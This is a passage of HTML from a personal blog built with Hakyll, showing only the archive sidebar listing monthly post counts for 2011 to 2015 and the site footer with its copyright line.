href="/entry/2015/05/">2015/05 (2)</a></li><li><a href="/entry/2015/04/">2015/04 (1)</a></li><li><a href="/entry/2015/03/">2015/03 (2)</a></li><li><a href="/entry/2015/02/">2015/02 (1)</a></li><li><a href="/entry/2015/01/">2015/01 (2)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2014"><label class="tree-toggle-button" for="tree-label-2014"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2014/">2014 (62)</a></label><ul class="tree-child"><li><a href="/entry/2014/12/">2014/12 (7)</a></li><li><a href="/entry/2014/11/">2014/11 (4)</a></li><li><a href="/entry/2014/10/">2014/10 (3)</a></li><li><a href="/entry/2014/09/">2014/09 (3)</a></li><li><a href="/entry/2014/08/">2014/08 (5)</a></li><li><a href="/entry/2014/07/">2014/07 (6)</a></li><li><a href="/entry/2014/06/">2014/06 (6)</a></li><li><a href="/entry/2014/05/">2014/05 (4)</a></li><li><a href="/entry/2014/04/">2014/04 (6)</a></li><li><a href="/entry/2014/03/">2014/03 (7)</a></li><li><a href="/entry/2014/02/">2014/02 (5)</a></li><li><a href="/entry/2014/01/">2014/01 (6)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2013"><label class="tree-toggle-button" for="tree-label-2013"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2013/">2013 (116)</a></label><ul class="tree-child"><li><a href="/entry/2013/12/">2013/12 (8)</a></li><li><a href="/entry/2013/11/">2013/11 (6)</a></li><li><a href="/entry/2013/10/">2013/10 (5)</a></li><li><a href="/entry/2013/09/">2013/09 (5)</a></li><li><a href="/entry/2013/08/">2013/08 (4)</a></li><li><a href="/entry/2013/07/">2013/07 (3)</a></li><li><a href="/entry/2013/06/">2013/06 (12)</a></li><li><a href="/entry/2013/05/">2013/05 (16)</a></li><li><a href="/entry/2013/04/">2013/04 (16)</a></li><li><a href="/entry/2013/03/">2013/03 (27)</a></li><li><a href="/entry/2013/02/">2013/02 (7)</a></li><li><a href="/entry/2013/01/">2013/01 (7)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2012"><label class="tree-toggle-button" for="tree-label-2012"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2012/">2012 (11)</a></label><ul class="tree-child"><li><a href="/entry/2012/12/">2012/12 (3)</a></li><li><a href="/entry/2012/09/">2012/09 (1)</a></li><li><a href="/entry/2012/07/">2012/07 (4)</a></li><li><a href="/entry/2012/04/">2012/04 (1)</a></li><li><a href="/entry/2012/03/">2012/03 (1)</a></li><li><a href="/entry/2012/01/">2012/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2011"><label class="tree-toggle-button" for="tree-label-2011"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2011/">2011 (12)</a></label><ul class="tree-child"><li><a href="/entry/2011/09/">2011/09 (1)</a></li><li><a href="/entry/2011/06/">2011/06 (1)</a></li><li><a href="/entry/2011/05/">2011/05 (1)</a></li><li><a href="/entry/2011/03/">2011/03 (6)</a></li><li><a href="/entry/2011/02/">2011/02 (1)</a></li><li><a href="/entry/2011/01/">2011/01 (2)</a></li></ul></li></ul></section></div></div><div class="footer-bottom"><div class="container"><div class="copyright">© 2011-2022 Tosainu. Site generated by <a href="https://jaspervdj.be/hakyll/" target="_blank" rel="nofollow noopener">Hakyll</a>.</div></div></div></footer></body></html>
